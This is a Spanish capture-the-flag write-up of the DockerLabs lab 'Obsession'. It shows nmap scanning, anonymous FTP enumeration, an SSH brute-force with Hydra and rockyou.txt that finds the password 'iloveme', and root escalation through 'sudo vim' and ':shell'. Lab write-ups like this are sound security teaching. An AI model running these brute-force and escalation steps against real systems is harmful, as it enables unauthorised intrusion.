# 🔓 Máquina: Obsession

**Plataforma:** DockerLabs · **Dificultad:** Muy fácil · **SO:** Ubuntu Linux · **IP:** `172.17.0.2`

---

## 🗺️ Flujo del ataque

```
Ping → Nmap (FTP + SSH + HTTP) → FTP anón (chat-gonza.txt + pendientes.txt)
→ curl HTML (comentario con usuario) → ffuf (/backup/backup.txt)
→ Hydra SSH → ssh russoski → sudo vim → :shell → root
```

---

## 1️⃣ Reconocimiento

### Verificación de conectividad

```bash
ping -c 2 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.076 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.055 ms
2 packets transmitted, 2 received, 0% packet loss
```

TTL = 64 → Sistema Linux confirmado.

---

### Escaneo de puertos con Nmap

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -vvv -oN scan 172.17.0.2
```

| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 21/tcp | open | FTP | vsftpd 3.0.5 |
| 22/tcp | open | SSH | OpenSSH 9.6p1 Ubuntu |
| 80/tcp | open | HTTP | Apache 2.4.58 (Ubuntu) |

El FTP permite **login anónimo** y expone dos archivos: `chat-gonza.txt` y `pendientes.txt`.

---

## 2️⃣ Enumeración FTP

### Conexión anónima y descarga de archivos

```bash
ftp 172.17.0.2
# Name: Anonymous
# Password: (vacío / enter)

ftp> ls
ftp> get chat-gonza.txt
ftp> get pendientes.txt
ftp> quit
```

### Lectura de los archivos

```bash
cat chat-gonza.txt
```

```
[16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
[16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo...
[16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro
```

```bash
cat pendientes.txt
```

```
1 Comprar el Voucher de la certificación eJPTv2 cuanto antes!
2 Aumentar el precio de mis asesorías online en la Web!
3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!
4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
  permisos habilitados que no son del todo seguros.. (recalca esta parte)
```

Identificamos el usuario **`russoski`** en el chat. El propio usuario advierte que tiene permisos mal configurados en su equipo.

---

## 3️⃣ Enumeración Web

### Comentario en el código fuente

```bash
curl -i http://172.17.0.2
```

Dentro del HTML se encuentra el siguiente comentario:

```html
<!-- Utilizando el mismo usuario para todos mis servicios, podré recordarlo fácilmente -->
```

El usuario reutiliza el mismo nombre en todos sus servicios, lo que confirma que `russoski` es válido para SSH.

---

### Fuzzing de directorios con ffuf

```bash
ffuf -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt \
     -u http://172.17.0.2/FUZZ -r -ac -v -recursion
```

```
[200] /backup
[200] /important
```

---

### /important

```bash
wget http://172.17.0.2/important/important.md
cat important.md
```

Contiene el **Manifiesto Hacker** (The Conscience of a Hacker). Sin relevancia directa para el reto.

---

### /backup ⭐

```bash
wget http://172.17.0.2/backup/backup.txt
cat backup.txt
```

```
Usuario para todos mis servicios: russoski (cambiar pronto!)
```

**Usuario confirmado:** `russoski`

---

## 4️⃣ Acceso inicial — Fuerza bruta SSH

### Ataque con Hydra

```bash
hydra -l russoski -P ~/Desktop/Lists/Rockyou/rockyou.txt -V ssh://172.17.0.2
```

```
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
```

---

### Conexión SSH

```bash
ssh russoski@172.17.0.2
# Password: iloveme
```

```
Welcome to Ubuntu 24.04 LTS (GNU/Linux 7.0.12-zen1-1-zen x86_64)
russoski@c9b63865b888:~$
```

---

## 5️⃣ Escalada de privilegios — russoski → root

### Listado de permisos sudo

```bash
sudo -l
```

```
User russoski may run the following commands on c9b63865b888:
    (root) NOPASSWD: /usr/bin/vim
```

`russoski` puede ejecutar `vim` como root sin contraseña. Vim permite lanzar una shell desde su modo de comandos con `:shell`, heredando los privilegios del proceso padre.

Referencia: [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/)

---

### Explotación

```bash
sudo vim
```

Dentro de vim, en modo normal:

```
:shell
```

```
root@c9b63865b888:/home/russoski# id
uid=0(root) gid=0(root) groups=0(root)

root@c9b63865b888:/home/russoski# whoami
root
```

🏆 Acceso **root** obtenido.

---

## 🎁 Extra — El video de Nágore

El chat del FTP hacía referencia a una URL guardada "en una ruta segura". Siendo root, exploramos el home:

```bash
ls /root
# Video-Nagore-Fernandez.txt

cat /root/Video-Nagore-Fernandez.txt
```

```
Al fin lo terminé! es tan hermosa.. <3
https://www.youtube.com/shorts/_v8GzGReTAk
```

La "ruta segura" era simplemente el directorio home de root. 

---

## ✅ Resumen de credenciales

| Usuario | Contraseña | Método |
|---------|------------|--------|
| `russoski` | `iloveme` | Hydra + rockyou.txt |
| `root` | — | `sudo vim` → `:shell` |

---

## 🔍 Lecciones aprendidas

- **FTP anónimo habilitado** — expone archivos internos con nombres de usuario y notas personales.
- **Comentario HTML con información operativa** — los comentarios del código fuente son públicos y nunca deben contener datos de configuración o usuarios.
- **Reutilización del mismo usuario en todos los servicios** — reduce el ataque a un único punto de falla.
- **Archivo `/backup/backup.txt` accesible públicamente** — contiene el nombre de usuario en texto plano.
- **`sudo NOPASSWD` sobre `vim`** — cualquier editor de texto o intérprete con acceso a exec/shell equivale a acceso root directo. Nunca se debe otorgar con `NOPASSWD`.

---

## 📚 Referencias

- [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/)
- [DockerLabs](https://dockerlabs.es/)
